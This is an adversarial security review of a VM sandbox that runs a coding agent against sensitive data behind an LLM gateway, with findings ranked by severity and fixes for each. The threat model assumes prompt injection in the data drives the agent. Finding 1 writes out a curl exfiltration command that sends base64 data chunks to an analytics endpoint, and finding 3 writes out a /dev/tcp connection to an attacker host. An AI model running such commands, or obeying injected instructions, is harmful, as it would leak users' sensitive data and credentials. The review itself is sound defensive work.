# Adversarial review: brine-secure for sensitive internal data

Date: 2026-11-10. Reviewed: `main` at f0e9c2d plus the uncommitted WIP in the main checkout, copied into this worktree.

Goal under test: a user can point Pi + Brine at internal sensitive data, and that data can't leave places we trust.

Threat model used:

- **Prompt injection in the data.** Sensitive data is often untrusted content like emails, tickets, PDFs and logs. Assume the agent can be made to run any shell command as `agent`.
- **Malicious code in the VM.** Assume a compromised npm package or Node tarball runs as root during bootstrap.
- **Other people with partial access.** OpenStack project members, Brine admins and other Brine users, anyone on the network path.

## Verdict

The VM sandbox design is sound in shape. Neutron enforces egress outside the guest, the key isn't in Terraform state, and `/data` is a throwaway copy. But it is not ready for sensitive data, for two reasons the VM can't fix:

1. Brine itself is out of scope for sensitive data by its own terms, and we don't know what it logs or where every model runs.
2. "Egress to Brine only" really means "egress to 199.241.160.16:443", and that IP also serves a public Plausible Analytics instance with an open registration page. That is likely an exfiltration channel to the internet.

The follow-up pass added two more High findings, 10 and 11. Both are bugs in our launcher, so we can fix them ourselves.

## Findings, most severe first

### 1. Brine's IP serves Plausible Analytics, an internet-readable write channel (High, verified in part)

`brine_out` allows TCP 443 to `brine_ip/32`. That IP is a shared reverse proxy. Any `Host` header other than `brine.sharcnet.ca` gets a self-hosted Plausible Analytics instance, the default vhost. Its `/register` page shows a working sign-up form.

Attack: an outsider registers a Plausible account and adds a site. Injected instructions in `/data` make the agent run
`curl -k -H 'Host: anything' https://199.241.160.16/api/event -d '{"domain":"<their site>","name":"pageview","url":"https://x/<base64 chunk>"}'`.
The outsider reads the chunks from their dashboard anywhere. No DNS is needed, and the `curl https://1.1.1.1` check doesn't catch it.

Checked: the vhost behaviour and the open register page, with plain GETs only. I made no account and sent no events. Not checked end to end: whether registration enforces email activation. An attacker controls their own email, so activation doesn't help anyway.

Fix: Brine needs its own IP, or the proxy must drop any request on that IP whose `Host` or SNI isn't `brine.sharcnet.ca`. Also ask whoever runs Plausible to set `DISABLE_REGISTRATION=invite_only`. Recheck every other vhost on that IP after any change.

### 2. Brine's terms and unknowns block sensitive data (High, policy)

The README already says it. Brine's terms say not to send sensitive data, and every file Pi reads goes into a prompt. Before this can change, the Brine owners need to answer:

- Are prompts or responses stored anywhere, and who can read them for how long? Places to check: LiteLLM spend logs with `store_prompts_in_spend_logs`, Langfuse or other callbacks, vLLM request logging, proxy access logs with bodies.
- Does any model route off SHARCNET? `explore1.md` flags `gaggle-trial`. `/openapi.json` lists provider pass-through routes `/openai_passthrough/*`, `/anthropic/*`, `/gemini/*`, `/vertex_ai/*`, `/bedrock/*`, `/azure/*` and `/langfuse/*`, plus `/mcp`, `/a2a`, `/v1/files`, `/v1/batches`, vector stores and assistants. LiteLLM lists most routes whether they're configured or not, so the list alone proves nothing. But each route that works with a user key either sends data off-site or stores it somewhere other things can read.
- Is traffic from Brine to vLLM encrypted, and who administers the workers?

Our code makes this worse. `pi-brine-setup.mjs` registers every chat model that `/v1/models` returns. If someone adds an external model to Brine later, it shows up in Pi's `/model` list and nobody notices.

Fix: on our side, hard-code an allowlist of on-prem models. The real control lives on Brine: a key whose `models` list has only on-prem models, with pass-through, files and MCP routes off for that key or team.

### 3. Bootstrap runs unpinned internet code as root, and that code stays on the VM (High)

During bootstrap the VM has open egress and runs, as root:

- `curl nodejs.org/... | tar`, with no checksum or signature check.
- `npm install -g @mariozechner/pi-coding-agent@0.73.1`. Only the top package is pinned. Its 21 direct dependencies, such as `undici`, `jiti`, `extract-zip`, `glob` and `@mariozechner/pi-ai`, are `^` ranges. Whatever their transitive trees resolve to on the day gets installed, and postinstall scripts run as root.

The lock comes afterwards, but anything installed before it is still there when the data and key arrive. With root, it reads `/data` and `models.json`. Without finding 1 it could only send data to Brine. With finding 1 it has the Plausible channel.

A related risk I haven't verified: established connections may survive the lock. Removing a security group from a port doesn't reliably cut tracked connections on every Neutron backend. OVN in particular has a history of keeping `ct.est` flows after an ACL is removed. Code from bootstrap could open a long-lived TLS connection before the lock and hold it. The 1.1.1.1 check only tests new connections.
Test it on Nibi: during bootstrap run `nohup bash -c 'exec 3<>/dev/tcp/<your host>/443; while sleep 2; do echo ping >&3; done' &`, then lock, and watch whether pings keep arriving.

Fix: use a pre-built image and drop the bootstrap phase. This also fixes 6, 10 and two README limits. Build the image with Node and Pi installed from a lockfile, using `npm ci` against a committed `package-lock.json` and a Node tarball checked against `SHASUMS256.txt`. Boot the VM with only the locked security group from the start and `config_drive = true`, so cloud-init never needs the metadata service. The VM then never has open egress.

### 4. A long-lived personal Brine key sits where the agent can read it (Medium)

`./brine.key` is the user's own key. The launcher writes it to `~agent/.pi/agent/models.json`, which the agent can read. Prompt injection can use it against any Brine route the key allows, including finding 2's list, for as long as the key lives. That's well past the VM's lifetime.

Fix: what `explore1.md` already planned. At launch, mint a per-sandbox virtual key with `/key/generate`, limited to on-prem `models`, with a `max_budget` and a `duration` of a few hours. `/key/delete` it in the EXIT trap. That needs a Brine-side key or service account allowed to mint keys, and that key stays on the laptop.

### 5. The OpenStack project is the real trust boundary (Medium)

Anyone with a role in the project can snapshot the running instance with `openstack server image create` and boot the copy with their own security group. That gives them `/data` and the key. They can also attach a group with open egress to the sandbox port, or open the console. The `clouds.yaml` application credential in the repo folder can do all of this too, and by default it's unrestricted and never expires. Cloud operators can always read the disks.

Fix: use one project per data-access group, and limit members to people cleared for the data. Create the application credential with an expiry, and restricted if the cloud allows it. State this in the README as an explicit assumption.

### 6. No cleanup if the laptop dies (Medium)

Teardown is a bash `EXIT` trap. A `kill -9`, power loss, a dead battery, or losing the Nibi API allowlist after an IP change leaves the VM running with the data and key and nobody watching. Even a clean destroy doesn't scrub the disk, because Ceph/RBD deletes aren't wipes.

Fix: per-session keys from finding 4 put a time limit on the key. For the VM, run a sweeper in the project that deletes `brine-*` servers older than N hours, or at least add `shutdown -P +<N>` in cloud-init so it stops on its own. For data at rest, ask the Nibi admins whether ephemeral disks are encrypted. If they aren't, someone has to accept that in writing.

### 7. The first SSH connection trusts any host key (Medium-Low)

`rm -f .ssh/known_hosts` plus `StrictHostKeyChecking accept-new` means SSH trusts the first key it sees. Anyone on the path at that moment, on a campus network or hotel wifi, can get `brine.key` and `/data`.

Fix: cloud-init prints the host key fingerprints to the console. Read them with `openstack console log show`, write them to `known_hosts`, and set `StrictHostKeyChecking yes`. That's about 5 lines.

### 8. The lock check runs inside the thing it's checking, and only tests one path (Low)

`curl https://1.1.1.1` runs as `agent` in the VM, so compromised code from finding 3 can make it pass. It also tests only one IP and port. Neutron does the enforcing either way, so this checks our config. It isn't a defence.

Fix: also check from the control plane that the port's only security group is `<name>-sandbox` and that the group's only egress rule is the Brine rule. `openstack port show -c security_group_ids` and `openstack security group rule list` cover both. Keep the curl as a smoke test.

### 9. Smaller things

- `--data` copies everything, including `.git`, `.env` and credential files. Anything in DIR can go into a prompt. Say so in the README, or add an rsync exclude list. Finding 11 makes this worse.
- The data can carry its own prompt injection. Pi loads `AGENTS.md` and `.pi/` from the working tree. `/data` isn't the cwd, but if the agent `cd`s into it, those files steer the agent. Findings 1 and 4 are what turn that into real harm.
- SSH ingress is `<public IP>/32`. Behind campus NAT or eduroam, that's everyone on the NAT. Key-only auth makes it acceptable, but setting `SSH_FROM_CIDR` to a VPN range is better.
- `curl api.ipify.org` sends the launcher's IP to a third party. Trivial, but it contradicts "never leaves SHARCNET". Setting `SSH_FROM_CIDR` already avoids it.
- WIP diff: dropping `lock_passwd: true` changes nothing, because that's cloud-init's default. The new `until` lock loop fails closed if SSH flakes, though its error message is misleading. Both are fine.

### 10. Relaunching can reopen internet egress on a VM that holds the data (High)

Added in the follow-up pass.

`sandbox:35-40` always runs `tf apply -var bootstrap=true` against the same state in the repo folder. `main.tf:114-134` attaches the bootstrap group to the existing port, so flipping `bootstrap` doesn't replace the instance. That group allows all IPv4 egress, per `main.tf:108-112`. Nothing in the launcher checks that the state is empty, forces a new instance, or locks for the whole session.

Finding 6 already shows a session can outlive its launcher. Say the launcher dies or the destroy fails, and the user runs `./sandbox` again with the same image and Brine IP. Terraform reuses the old VM and puts it back on open egress, while `/data`, Pi sessions and `models.json` are still on disk. A process left behind by prompt injection only has to wait for the network to open. This needs neither Plausible nor a connection that survives the lock. Running a second `./sandbox` in the same checkout during a live session does the same thing. Terraform's per-operation lock doesn't cover the gap between applies or the interactive session.

Checked: I ran a copy of the unchanged launcher with Terraform, SSH, name lookup and rsync mocked, and a marker file standing in for leftover data. It ran `init`, `apply bootstrap=true`, `output`, `apply bootstrap=false`, the data copy and `destroy`, in that order. Nothing looked at or removed the old data before opening egress. VM reuse follows from the Terraform config. I didn't test a real Neutron transition or an actual exfiltration.

Fix: the pre-built image from finding 3 removes bootstrap egress entirely. Until then, refuse to launch if the state already has an instance or port, require a confirmed destroy before a retry, and hold a launcher lock from `terraform init` until teardown finishes. Give each session its own state and instance. Never turn on bootstrap egress for a VM that has already been used.

Test: leave dummy data and a waiting process in a sandbox, kill its launcher, and launch again. The new launch must refuse or use a new VM, and must not loosen the old VM's rules. A second launch running at the same time must also refuse or use separate resources. Only run the cloud version with dummy data and an approved test endpoint.

### 11. A relative `--data` path uploads the launcher's own credentials (High)

Added in the follow-up pass.

`sandbox:6` changes into the script's directory before `sandbox:13-15` checks and resolves `--data`. Then `sandbox:69-70` rsyncs that directory with no exclusions. So a user who runs `/path/to/brine-secure/sandbox --data .` from their own project uploads brine-secure, not their project. That folder holds `clouds.yaml` and `brine.key`, per the README, and the SSH private key the launcher creates. Rsync ignores `.gitignore`, so all three go up.

The upload makes the files root-owned with mode `0444`, so the agent can read them. Now the guest has a cloud application credential, not only the Brine key that finding 4 expects. Anything the agent reads can go to Brine. If any other egress path is open, such as finding 1 or 10, the cloud credential can leave too and gives an attacker the project access from finding 5. I didn't test whether the locked VM can reach the cloud API, and the leak doesn't depend on it.

Checked: I ran the copied launcher from a separate directory with `--data .`, with dummy `clouds.yaml`, `brine.key` and `.ssh` files in place. The mocked rsync recorded the launcher directory as its source. Absolute paths don't hit this bug. Other relative paths either pick the wrong directory or fail the check.

Fix: resolve `--data` against the caller's directory before the `cd`. Refuse any source that contains the launcher's folder, or pick files through an explicit list that excludes credentials. Print the resolved source before copying, and document that hidden files go up too. Fixing the path alone won't stop a user from pointing `--data` at the launcher folder on purpose.

Test: from a sibling project, run with `--data .` and with `--data some/subdir`, and confirm the source is under the caller's directory. Then point `--data` at the launcher folder with dummy credentials in it and confirm they don't get copied.

## What holds up

- Neutron enforces egress outside the guest, with `delete_default_rules`. IPv6 egress is denied because no IPv6 rule exists.
- The Brine key never enters Terraform state, user data or metadata.
- TLS to Brine checks the certificate, a wildcard `*.sharcnet.ca`, so nobody can quietly redirect the pinned `/etc/hosts` entry.
- `/data` is a root-owned, read-only copy, and nothing syncs back.

## Order of work if this goes ahead

1. Brine owners: a dedicated IP or strict `Host`/SNI filtering for finding 1, plus written answers on logging and model location for finding 2. Without these, stop.
2. Ours, now: fix the relative `--data` path (11) and refuse to relaunch over existing state (10). These are small and don't wait on anyone.
3. Pre-built image, no bootstrap egress, config drive (3). This retires 10 for good.
4. Per-sandbox scoped keys and a model allowlist (2, 4).
5. A dedicated project and an expiring credential (5), a sweeper (6), host key pinning (7), the control-plane lock check (8).

## Method

The first pass read the code and made plain GET requests to Brine's IP for finding 1. The follow-up pass reviewed commit 547bde6 and traced the launcher, Terraform resources, cloud-init and data flow. It validated findings 10 and 11 against a temporary copy of the launcher with dummy credentials and data and local stand-ins for Terraform, SSH, name lookup and rsync. It changed no cloud resources, read no real credentials, and sent nothing to Brine or any exfiltration endpoint. Nobody has rechecked the first pass's remote observations since.
